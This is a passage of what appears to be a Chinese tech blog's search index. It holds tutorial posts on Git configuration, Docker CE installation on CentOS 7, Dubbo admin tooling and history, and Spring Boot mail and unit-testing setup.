设置全局的HTTP代理$ git config --global http.proxy 192.168.1.122:1080#设置当前仓库的Socks5代理$ git config http.proxy socks5://192.168.1.122:1081#设置全局的Socks5代理$ git config --global http.proxy socks5://192.168.1.122:1081# 取消当前仓库的代理$ git config --unset http.proxy# 取消全局的代理$ git config --global --unset http.proxy Git 设置用户名、邮箱1234567891011121314151617# 查看当前仓库的配置信息$ git config --list# 查看全局的配置信息$ git config --list --global# 设置当前仓库的用户名、邮箱$ git config user.name clay$ git config user.email example@qq.com# 设置全局的用户名、邮箱$ git config --global user.name clay$ git config --global user.email example@qq.com# 取消设置全局的用户名、邮箱$ git config --global --unset user.name$ git config --global --unset user.email Git 更改最后一次提交的信息12345678# 更改最后一次提交的备注信息$ git commit --amend# 更改最后一次提交的用户名，这里相当于指定 "user.name"$ git commit --amend --author=clay# 更改最后一次提交的日期，第一个日期是提交日期，第二个日期是作者日期$ GIT_COMMITTER_DATE="2021-02-04T12:32:03" git commit --amend --date="2021-02-04T12:32:03" Git 撤销提交并清除痕迹123456789101112# 撤销最近前4次的提交，其中4表示撤销最近前几次提交$ git reset --hard HEAD~4# 也可以指定commit_id，表示撤销某次提交（6ddd44e）之前的所有提交$ git reflog$ git reset --hard 6ddd44e# 强制更新远程的提交历史$ git push -f# 或者强制更新特定分支的提交历史$ git push origin master -f var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"版本控制"},{title:"Docker 之一 Docker 介绍与安装",url:"/posts/57bca56f.html",text:'Docker 相关站点 Docker Hub Docker Github Docker Official Docs EN Docker Official Docs CN Docker Official Website EN Docker Official Website CN Docker 相关技术 Golang CI/CD Mesos Swarm Machine Compose Kubernetes Docker 的目标 Build and Ship any Application Anywhere，即通过对应组件的封装、分发、部署、运行等生命周期的管理，使用户的应用及其运行环境能够做到 “一次构建，到处运行”，官方图解如下： 什么是容器？ 一种虚拟化方案 操作系统级别的虚拟化 只能运行相同或相似内核的操作系统 依赖于 Linux 内核特性：Namespace 和 Cgroups（Control Group），前者用于资源隔离，后者用于资源限制 容器只能使用宿主机的 kernel，并且不能修改；即所有容器都共用宿主机的 kernel，在容器中无法对 kernel 进行升级。 Docker 与虚拟机的区别 参考文章：Docker 容器与虚拟机有什么区别，VM vs Docker 的图解如下： Docker 的三要素介绍 三要素：仓库、镜像、容器 Docker 本身是一个容器运行载体或称之为管理引擎，基于 C/S 模式，即客户端 / 守护进程 Docker 镜像是层叠的只读文件系统，镜像用作创建 Docker 容器，一个镜像可以创建多个容器 容器是用镜像创建的运行实例，这里的镜像相当于 Java 中的类，容器相当于通过该类创建的对象实例 仓库是集中存放镜像文件的场所，仓库（Repository）和仓库注册服务器（Registry）是有区别的，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（Tag） 仓库分为公开仓库（Public）和私有仓库（Private）两种形式，最大的公开仓库是 Docker Hub，国内的公开仓库有阿里云、网易云等 Docker 架构图 为什么要在开发中使用 Docker 一致的开发环境，Docker 可以保证整个研发团队使用一致的开发环境 在开发时只需 Docker，无需在自己的开发主机上搭建各种编程语言环境 简化了编译和构建的复杂性，对于一些动辄数小时的编译和构建工作，可以用 Docker 来简化 部署很简单，应用程序在容器中运行，开发环境与最终的生产环境保持一致，这减少了部署出错的可能性 可以使用同一编程语言（如 go, python, ruby, java, node 等）的多个版本，无需解决多版本冲突的问题 Docker 拥有几大特性：持续集成、版本控制、可移植性、隔离性和安全性 Docker 属于解决运行环境和配置问题，方便做持续集成，并有助于整体发布的容器虚拟化技术 Docker 提供更快速的应用交付和部署，更便捷的升级和扩缩容，更简单的系统运维，更高效的计算资源利用 Docker 各版本对 Centos 的兼容 docker-io（旧版本） Centos7（64-bit），Linux 内核版本为 3.10 以上 Centos6.5（64-bit）或更高版本，Linux 内核版本为 2.6.32-431 或更高 docker-ce（新版本） Centos7（64-bit），Linux 内核版本为 3.10 以上 docker 新旧版本名称的区别 旧版本的名称是 docker、docker-io、docker-engine 新版本的名称是 docker-ce（社区版）、docker-ee（企业版） Centos7 安装 Docker-CE 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# 查看Centos系统版本# cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core)# 查看Linux内核版本# uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux# 卸载旧版本的Docker，将保留/var/lib/docker/的内容，包括镜像、容器、存储卷和网络# yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine# 如需删除旧版本的所有镜像、容器和存储卷，请运行下列命令# rm -rf /var/lib/docker# 安装所需的软件包# yum install yum-utils device-mapper-persistent-data lvm2# 添加Docker的阿里云yum镜像仓库（默认使用stable镜像仓库）# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo# 更新yum软件包索引# yum makecache fast# 查询可安装的Docker版本# yum list docker-ce.x86_64 --showduplicates | sort -rdocker-ce.x86_64 3:18.09.0-3.el7 docker-ce-stabledocker-ce.x86_64 18.06.1.ce-3.el7 docker-ce-stabledocker-ce.x86_64 18.06.0.ce-3.el7 docker-ce-stabledocker-ce.x86_64 18.03.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 18.03.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.12.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.12.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.09.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.09.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.2.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.3.ce-1.el7 docker-ce-stabledocker-ce.x86_64 17.03.2.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.0.ce-1.el7.centos docker-ce-stable# 安装最新版的Docker-CE# yum install docker-ce# 或者安装指定版本的Docker-CE# yum install docker-ce-18.06.1.ce-3.el7# 启动Docker# systemctl start docker# 设置Dockerr开机自启动（非必需）# systemctl enable docker# 查看已安装的Docker版本# docker versionClient: Version: 18.09.0 API version: 1.39 Go version: go1.10.4 Git commit: 4d60db4 Built: Wed Nov 7 00:48:22 2018 OS/Arch: linux/amd64 Experimental: falseServer: Docker Engine - Community Engine: Version: 18.09.0 API version: 1.39 (minimum version 1.12) Go version: go1.10.4 Git commit: 4d60db4 Built: Wed Nov 7 00:19:08 2018 OS/Arch: linux/amd64 Experimental: false# 验证是否正确安装了docker-ce# 以下命令将下载一个测试镜像并在容器中运行它，容器运行时将输出一条参考消息并退出# docker run hello-world Centos7 配置 Docker-CE 的镜像加速 123456789101112# 创建Docker的配置文件目录# mkdir -p /etc/docker# 创建Docker的配置文件，并指定Docker的镜像源地址，其中注册阿里云或者网易云帐号后可以从镜像服务中获取xxxxxx序列号，建议使用阿里云的镜像服务# vim /etc/docker/daemon.json{"registry-mirrors": ["https://xxxxxx.mirror.aliyuncs.com"]}# 加载新的配置# systemctl daemon-reload# 重新启动Docker# systemctl restart docker Centos7 卸载 Docker-CE 1234567# 卸载Docker-CE安装包，主机上的镜像、容器、存储卷、或定制配置文件不会自动删除# yum remove docker-ce# 如需删除所有镜像、容器和存储卷，请运行下列命令# rm -rf /var/lib/docker# 手动删除任何已编辑的Docker配置文件 更改 Docker 默认安装路径 值得一提的是，如果已经存在大量 Docker 容器，更改 Docker 的默认安装路径存在数据丢失的风险，请提前备份重要的数据！建议使用下面介绍的第二种方法进行操作，因为第一种方法存在升级问题，那就是当 Docker 的版本升级后，docker.service 配置文件的内容会被覆盖掉。 12345678910111213141516171819202122# 方法一（通过Docker系统服务的配置文件指定安装目录路径）# 停止Docker# systemctl stop docker# 将原安装目录移动到新安装目录，例如移动至/home/docker# 注意，这里即使不移动原安装目录也是可以的（Docker会在新目录下自动创建相关文件），只是不移动的话以前的镜像、容器数据就会丢失# mv /var/lib/docker /home# 修改docker.service文件，在启动Docker的时候，通过--graph参数指定新安装目录的路径# vim /usr/lib/systemd/system/docker.serviceExecStart=/usr/bin/dockerd -H unix:// --graph /home/docker# 使配置文件生效# systemctl daemon-reload# 启动Docker# systemctl start docker# 查看Docker默认安装目录是否更改了# docker infoDocker Root Dir: /home/docker 12345678910111213# 方法二（通过建立软链接，将旧的安装目录/var/lib/docker重定向到新的安装目录/home/docker，这样就可以避免修改docker.service文件）# 停止Docker# systemctl stop docker# 移动目录# mv /var/lib/docker /home# 创建软链接# ln -s /home/docker /var/lib/docker# 启动Docker# systemctl start docker 12345678# 验证Docker的默认安装路径更改后，是否可以正常工作# 查看后台进程# ps -aux|grep docker# 测试是否迁移成功# docker pull centos# docker run -it centos Docker 相关文件介绍 123Docker默认安装目录：/var/lib/dockerDocker配置文件： /etc/docker/daemon.jsonDocker系统服务的配置文件： /usr/lib/systemd/system/docker.service 其他 Linux 发行版安装 Docker-CE Debian 安装 Docker-CE Ubuntu 安装 Docker-CE Fedora 安装 Docker-CE var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Dubbo 之三 Dubbo 管理与监控中心的安装",url:"/posts/d70c90c.html",text:'Github 项目地址 Incubator Dubbo Ops Github 前言 与以前相比，Incubator Dubbo Ops 项目中 master 分支的代码进行了大量重构，重构之后的代码目前在 develop 分支；同时 develop 分支的部署方式发生了不少变化，主要体现在 develop 分支采用了前后端分离的部署方式，下面将会分别详细介绍 master 与 develop 分支具体的部署方式。此教程的创建日期为 2018-12-20，由于官方项目正在不断迭代开发中，因此此教程在日后可能与官方的最新代码不同步，一切以官方的 Github 说明文档为准。 incubator-dubbo-ops master 分支（截止 2018-12-20） 项目说明 项目是标准的 Spring Boot 工程 主线代码已经进行了重构，官方建议使用 develop 分支 构建准备 本地安装并启动 Zookeeper 服务端 本地安装 Maven，并配置 Maven 的环境变量 构建步骤 1234567891011121314151617181920# 克隆master分支的代码# git clone -b master https://github.com/apache/incubator-dubbo-ops.git# 代码的目录结构incubator-dubbo-ops-master├── dubbo-admin├── dubbo-monitor-simple├── dubbo-registry-simple├── pom.xml└── README.md# 进入项目根目录$ cd incubator-dubbo-ops-master# 修改注册中心地址$ vim dubbo-admin/src/main/resources/application.propertiesdubbo.registry.address=zookeeper://127.0.0.1:2181# 使用maven命令进行打包$ mvn clean package 构建结果 在 incubator-dubbo-ops-master/dubbo-admin/target 目录中生成 dubbo-admin-0.0.1-SNAPSHOT.jar 在 incubator-dubbo-ops-master/dubbo-monitor-simple/target 目录中生成 dubbo-monitor-simple-2.0.0-assembly.tar.gz，解压缩后可以找到用于启动或停止监控的 shell 脚本。 在 incubator-dubbo-ops-master/dubbo-registry-simple/target 目录中 dubbo-registry-simple-2.0.0-assembly.tar.gz，解压缩后可以找到用于启动或停止注册的 shell 脚本。 运行 dubbo-admin（图形化的服务管理后台） 1234567891011121314# 进入构建目标目录$ cd incubator-dubbo-ops-master/dubbo-admin/target# 前台运行$ java -jar dubbo-admin-0.0.1-SNAPSHOT.jar# 或者后台运行$ nohup java -jar dubbo-admin-0.0.1-SNAPSHOT.jar &amp;# 浏览器访问，登录的用户名和密码均为guesthttp://127.0.0.1:7001# 停止运行$ sudo pkill -9 java dubbo-admin（图形化的服务管理后台）Web 界面 运行 dubbo-monitor-simple（图形化的监控后台） 123456789101112131415161718# 进入构建目标目录$ cd incubator-dubbo-ops-master/dubbo-monitor-simple/target# 解压文件$ tar -xvf dubbo-monitor-simple-2.0.0-assembly.tar.gz# 修改注册中心地址$ vim dubbo-monitor-simple-2.0.0/conf/dubbo.propertiesdubbo.registry.address=zookeeper://127.0.0.1:2181# 运行服务（默认后台运行）$ ./dubbo-monitor-simple-2.0.0/assembly.bin/start.sh# 浏览器访问http://127.0.0.1:8080# 停止服务$ ./dubbo-monitor-simple-2.0.0/assembly.bin/stop.sh dubbo-monitor-simple（图形化的监控后台）Web 界面 解决 Spring 应用添加 &lt;dubbo:monitor protocol=”registry”/&gt; 配置后，无法连接 dubbo-monitor 的问题 123# 配置本机ipv4的ip + 用户主机名，即添加如下一行内容，将其中的xxx替换为本机真实的IP地址，例如192.168.1.198$ sudo vim /etc/hostsxxx.xxx.xxx.xxx centos7 incubator-dubbo-ops develop 分支（截止 2019-02-23） 前端说明 依赖 NPM 进行管理和构建 使用 Vue.js 作为 Javascript 框架，Vuetify 作为 UI 框架 在开发环境中，可以按照此文档的步骤进行构建 采用前后端分离的部署方式，前端支持热加载，任何页面的修改都可以实时反馈，不需要重启应用 后端说明 项目是标准的 Spring Boot 工程，可以在任何 Java IDE 中运行 支持 Swagger，部署完成后可以访问 http://localhost:8080/swagger-ui.html 来查看所有的 Restful API 构建准备 本地安装并启动 Zookeeper 服务端 本地安装 Maven，并配置 Maven 的环境变量 本地安装 NodeJS，并配置 NodeJS 的环境变量（非必需，Maven 插件会自动安装 NodeJS） 构建步骤 123456789101112131415161718192021222324252627282930# 克隆develop分支的代码$ git clone -b develop https://github.com/apache/incubator-dubbo-ops.git# 代码目录结构incubator-dubbo-ops├── codestyle├── DISCLAIMER├── doc├── dubbo-admin-distribution├── dubbo-admin-server├── dubbo-admin-ui├── LICENSE├── mvnw├── mvnw.cmd├── NOTICE├── pom.xml├── README.md└── README_ZH.md# 进入项目根目录$ cd incubator-dubbo-ops# 修改注册中心地址，更多配置可参考：https://github.com/apache/incubator-dubbo-ops/wiki/Dubbo-Admin%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E$ vim dubbo-admin-server/src/main/resources/application.propertiesadmin.registry.address=zookeeper://127.0.0.1:2181admin.config-center=zookeeper://127.0.0.1:2181admin.metadata-report.address=zookeeper://127.0.0.1:2181# 使用maven命令进行打包$ mvn clean package 运行 dubbo-admin-server（图形化的服务管理后台） 12345678# 进入目录$ cd incubator-dubbo-ops# 通过maven插件运行应用$ mvn --projects dubbo-admin-server spring-boot:run# 浏览器测试访问http://localhost:8080 dubbo-admin-server（图形化的服务管理后台）Web 界面 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式 linux"},{title:"Dubbo 之二 Dubbo 发展历程",url:"/posts/48ccc519.html",text:'相关站点 incubator-dubbo github incubator-dubbo docs incubator-dubbo-spring-boot-project github dubbo github dubbo 周边生态 RPC 介绍 RPC 核心模块： 通讯、序列化 主流 RPC 框架： Dubbo、gRPC、Thrift、HSF、Motan、ZBUS Dubbo 发展历程 2011 年 10 月 27 日，阿里巴巴开源了自己的 SOA 服务化治理方案的核心框架 Dubbo。 2012 年 10 月 23 日发布 Dubbo2.5.3 版本，至此之后，阿里基本停止了对 Dubbo 的主要升级；只在 2013 年和 2014 年更新过 2 次对 Dubbo2.4 的维护版本，然后停止了所有维护工作；同时 Dubbo 对 Srping 的支持也停留在了 Spring 2.5.6 版本上。在阿里停止维护和升级 Dubbo 期间，当当网开始维护自己的 Dubbo 分支版本 Dubbox，支持了新版本的 Spring，并对外开源了 Dubbox。而网易考拉也维护了自己的独立分支 Dubbok，可惜并未对外开源。 2017 年 9 月 7 日发布 Dubbo 的 2.5.4 版本，距离上一个版本 2.5.3 发布已经接近快 5 年时间了。在随后的几个月中，阿里 Dubbo 开发团队以差不多每月一版本的速度开始快速升级迭代，修补了 Dubbo 老版本多年来存在的诸多 bug，并对 Spring 等组件的支持进行了全面升级。 2018 年 1 月 8 日发布 Dubbo 2.6.0 版本，新版本将之前当当网开源的 Dubbo 分支 Dubbox 进行了合并，实现了 Dubbo 版本的统一整合。 2018 年 1 月 8 日，Dubbo 创始人之一梁飞在 Dubbo 交流群里透露了 Dubbo 3.0 正在动工的消息。Dubbo 3.0 内核与 Dubbo2.0 完全不同，但兼容 Dubbo 2.0。Dubbo 3.0 将以 Streaming 为内核，不再是 Dubbo 时代的 RPC，但是 RPC 会在 Dubbo3.0 中变成远程 Streaming 对接的一种可选形态。Dubbo 3.0 将支持可选 Service Mesh，多加一层 IPC，这主要是为了兼容老系统，而内部则会优先尝试内嵌模式。代理模式 Ops 可独立升级框架，减少业务侵入，而内嵌模式可以带业务测试、部署节点少、稳定性检测方便。同时，可以将 Dubbo3.0 启动为独立进程，由 dubbo-mesh 进行 IPC，路由、负载均衡和熔断机制将由独立进程控制。 2018 年 2 月 15 日，阿里将 Dubbo 开源贡献给 Apache，即 incubator-dubbo 总结，从 Dubbo 新版本的路线规划上可以看出，新版本的 Dubbo 在原有服务治理的功能基础上，将全面拥抱微服务和 Service Mesh。同时考虑到在阿里云已经有了 Dubbo 的商业版本，在未来一段时间内，Dubbo 的更新与维护应该不会再长时间中断。 Dubbo 官方介绍 第二届 Dubbo 开发者沙龙 PDF 资料 朱勇: Dubbo 开源现状与未来规划 潘志伟: Dubbo 在互金行业的应用场景 小马哥: Dubbo Cloud Native 之路的实践与思考 郭平: Nacos - 贡献 Dubbo 生态，阿里巴巴注册中心和配置中心开源计划 Dubbo 2.7 最典型的三个新特性 异步化改造 三大中心改造 服务治理增强 Dubbo 2.7 改动与升级说明 Dubbo 2.7 官方改动说明 Dubbo 2.7 升级与可能的兼容性问题总结 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式"},{title:"Dubbo 之一架构演进",url:"/posts/223fed88.html",text:'单一应用架构 优点 简单实用、便于维护，开发成本较低 缺点 部署麻烦，添加、修改个别模块功能，需要重新将所有模块的代码部署到各个服务器 单台服务器的性能有限，不适合对外提供所有模块功能 存在单点故障问题 关键点 数据访问框架（ORM） 垂直应用架构 优点 性能扩展比较容易 协同开发比较容易，每个独立的模块由对应的开发人员负责 缺点 每个模块都包含了 MVC 三层的所有代码 不适用页面经常修改的场景，如果单个模块对应的页面修改了，需要重新部署该模块的所有代码到服务器 各个模块之间不可能完全独立，大量应用之间需要相互交互，调用关系相对复杂 关键点 用于加速前端页面开发的 Web 框架（MVC） 分布式服务架构 优点 垂直和横向扩展都比较容易 前端页面可以快速迭代开发 提高了系统整体的高可用、高性能、高并发方面的能力 缺点 系统的复杂性提高了很多，包括开发与运维方面， 关键点 分布式服务框架 (RPC) 如何拆分业务与提高业务的复用程度 流动计算架构（SOA） 分布式架构中的服务越来越多，导致交互越发复杂，不可避免会出现资源浪费的情况。如何才能更好地管理复杂的调用关系、提高资源利用率、对整个服务集群进行动态控制呢？服务治理被引入来解决此问题。服务治理一般包括以下内容：1）通过注册中心管理所有服务（即服务注册与发现）2）路由选择、负载均衡及容错处理3）服务升、降级，熔断，权重调整4）服务过滤（黑名单、白名单）5）服务状态检测、监测6）服务权限控制7）服务依赖关系8）监控与统计9）资源隔离 Dubbo 官方的架构演进图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"架构 分布式"},{title:"SpringBoot 开发随笔",url:"/posts/4e06a2ec.html",text:'Spring Boot 配置邮件发送在本地开发环境测试，Spring Boot 能够正常发送邮件，但部署到阿里云 ECS 服务器以后，一直没有收到邮件，部分关键日志信息如下： 12345678org.springframework.mail.MailSendException: Mail server connection failed; nested exception is com.sun.mail.util.MailConnectException: Couldn\'t connect to host, port: smtp.163.com, 25; timeout -1; nested exception is: java.net.ConnectException: 连接超时 (Connection timed out). Failed messages: com.sun.mail.util.MailConnectException: Couldn\'t connect to host, port: smtp.163.com, 25; timeout -1; nested exception is: java.net.ConnectException: 连接超时 (Connection timed out) at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:447) at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:322) at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:311) 从现有情况看，跟程序运行环境有关，查看相关资料，发现在阿里云 ECS 服务器上，默认禁用了 25 端口，所以在通过 25 端口去连接邮件服务器时，无法连上，就报超时了。官方建议使用 465 端口，而 456 端口是 SSL 协议的，所以不仅要换端口，还需要进行 SSL 协议替换。下面是在 application.properties 进行的邮件发送相关配置，经过这样配置后，在阿里 ECS 上就能够正常发送邮件了 123456789101112131415# Mail Configspring.mail.host=smtp.163.comspring.mail.username=xxx@163.comspring.mail.password=xxxxxspring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=true# SSL Configspring.mail.port=465spring.mail.protocol=smtpspring.mail.default-encoding=UTF-8spring.mail.properties.mail.smtp.ssl.enable=truespring.mail.properties.mail.smtp.socketFactory.port=465spring.mail.properties.mail.smtp.socketFactory.class=javax.net.ssl.SSLSocketFactory 163 邮箱相关服务器信息如下： bootstrap.yml 与 application.yml 的区别加载顺序 bootstrap.yml &gt; application.yml &gt; application-dev.yml bootstrap.yml 作用于应用程序上下文的引导阶段，bootstrap.yml 由父 Spring ApplicationContext 加载 若 bootstrap.yml 和 application.yml 在同一目录下时，bootstrap.yml 先加载，application.yml 后加载 若 application.properties 和 application.yml 在同一目录下时，且存在相同的配置，则 application.properties 会覆盖 application.yml 里面的属性，因为 application.properties 会后加载，也就是说哪个文件被最后加载，哪个才具有最高级 配置区别 bootstrap.yml 和 application.yml 都可以用来配置参数 bootstrap.yml 用来程序引导时执行，应用于更加早期配置信息读取，可以理解成系统级别的一些参数配置，这些参数一般是不会变动的，一旦 bootStrap.yml 被加载，则内容不会被覆盖 application.yml 用来定义应用级别的配置参数，即应用程序特有的配置信息，可以用来配置后续各个模块中需使用的公共参数等。如果加载的 application.yml 的内容标签与 bootstrap.yml 的标签一致，那么 application.yml 会覆盖 bootstrap.yml, 而 application.yml 里面的内容可以动态替换 典型应用场景 一些加密 / 解密的场景 一些固定的不能被覆盖的属性 当使用 Spring Cloud Config Server 的时候，应该在 bootstrap.yml 里面指定 spring.application.name 和 spring.cloud.config.server.git.uri。这是因为当使用 Spring Cloud 的时候，配置信息一般是从 Config Server 加载的，为了取得配置信息（比如密码等），需要一些提早的或引导配置。因此，把 Config Server 信息放在 bootstrap.yml，用来加载真正需要的配置信息。 扫描父模块的 Mapper 类与 XML 映射文件子模块若希望扫描到父模块里 MyBatis 的 Mapper 类与 XML 映射文件，需要加入以下配置： 在主启动类上指定 Mapper 扫描的包名，父模块的包名命名规则必须符合 com.shop.**.mapper 规则 12345@MapperScan(basePackages = "com.shop.**.mapper")@SpringBootApplication(scanBasePackages = "com.shop")public class AuthApplication {} 在 MyBatis-Plus 的配置中，指定 XML 映射文件的扫描路径，同时指定 MyBatis 的类型别名扫描规则 123mybatis-plus: mapper-locations: classpath*:/mapper/**/*.xml type-aliases-package: com.shop.**.entity Spring Boot 单元测试基础使用 引入 Maven 依赖 1234567891011&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; 添加 @RunWith、@SpringBootTest 注解 123456789@RunWith(SpringRunner.class)@SpringBootTestpublic class SimpleTest { @Test public void doTest() { int num = new Integer(1); Assert.assertEquals(num, 1); }} 其中有两个 runner 可以选择，分别是 SpringRunner 和 SpringJUnit4ClassRunner。如果是在 Junit 4.3 之前，只能选择 SpringJUnit4ClassRunner，如果是 Junit 4.3 之后，建议选择 SpringRunner，其中 SpringRunner 仅仅继承了 SpringJUnit4ClassRunner，没有任何的额外代码。 123456789@RunWith(SpringJUnit4ClassRunner.class)@SpringBootTestpublic class SimpleTest { @Test public void doTest() { int num = new Integer(1); Assert.assertEquals(num, 1); }} 注解说明 @RunWith：标识为 JUnit 的运行环境 @SpringBootTest：获取启动类、加载配置，确定装载 Spring Boot @Test：声明需要测试的方法 @BeforeClass：针对所有测试，只执行一次，且必须被 static void 修饰 @AfterClass：针对所有测试，只执行一次，且必须被 static void 修饰 @Before：每个测试方法运行前都会执行的方法 @After：每个测试方法运行后都会执行的方法 @Ignore：忽略方法 断言测试 断言测试也就是期望值测试，是单元测试的核心，也就是决定测试结果的表达式，Assert 对象中的断言方法如下： Assert.assertEquals：对比两个值相等 Assert.assertNotEquals：对比两个值不相等 Assert.assertSame：对比两个对象的引用相等 Assert.assertArrayEquals：对比两个数组相等 Assert.assertTrue：验证返回是否为真 Assert.assertFlase：验证返回是否为假 Assert.assertNull：验证 Null Assert.assertNotNull：验证非 Null 超时测试 给 @Test 注解设置 timeout 属性即可，时间单位为毫秒： 1@Test(timeout = 1000) 数据库测试 在测试数据操作的时候，若不想让测试数据污染数据库，只需要给测试类或者测试方法添加 @Transactional 注解即可，这样既可以测试数据操作方法，又不会污染数据库，即默认会回滚对数据库的所有写操作。 1234567891011@Test@Transactionalpublic void saveTest() { User user = new User(); user.setName("Adam"); user.setAge(19); user.setPwd("123456"); userRepository.save(user); System.out.println("userId:" + user.getId()); Assert.assertTrue(user.getId()&gt;0);} Web 模拟测试 在 Spring Boot 项目里面可以直接使用 Junit 对 Web 项目进行测试，Spring 提供了 TestRestTemplate 对象，使用这个对象可以很方便的进行请求模拟。 Web 测试只需要进行两步操作： 在 @SpringBootTest 注解上设置 webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT，即使用随机端口 使用 TestRestTemplate 类进行 POST 或 GET 请求 12345678910111213@RunWith(SpringRunner.class)@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)public class UserControllerTest { @Autowired private TestRestTemplate restTemplate; @Test public void getName() { String name = restTemplate.getForObject("/name", String.class); Assert.assertEquals("Adam", name); }} 其中 getForObject() 的含义代表执行 GET 请求，并返回 Object 类型的结果，第二个参数表示将返回结果转换为 String 类型，更多的请求方法如下： getForEntity：Get 请求，返回实体对象（可以是集合） postForEntity：Post 请求，返回实体对象（可以是集合） postForObject：Post 请求，返回对象 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 开发随笔"},{title:"SpringBoot 与 SpringCloud 介绍",url:"/posts/cd6beb9c.html",text:'SpringBootSpringBoot 站点 SpringBoot 官网 SpringBoot 官方文档 SpringBoot Github 项目 SpringBoot 示例源码 SpringBoot 特性 创建独立的 Spring 应用程序 嵌入的 Tomcat，无需部署 WAR 文件，适用于准生产环境 简化 Maven 配置 自动配置 Spring 提供生产就绪型功能，如指标、健康检查、外部配置 开箱即用，无需 XML 配置 SpringBoot 核心模块 